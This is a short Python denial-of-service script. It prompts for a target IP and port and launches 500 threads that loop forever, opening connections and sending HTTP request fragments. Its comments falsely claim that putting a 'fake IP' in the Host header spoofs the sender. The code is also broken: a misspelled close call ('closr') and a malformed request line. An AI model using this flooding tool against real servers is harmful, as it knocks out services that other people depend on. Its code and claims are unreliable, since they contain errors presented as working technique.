import threading
import socket

target = input("please enter the ip: ")
port = int(input("please enter the port: "))

fake_ip = "10.0.0.1"

def attack():
    while True:
        #create the socket which basically create a packet
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #establish the connection
        s.connect((target, port))
        #send the packet to the server
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        #then send the incomplete packet from the fake ip
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.closr()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
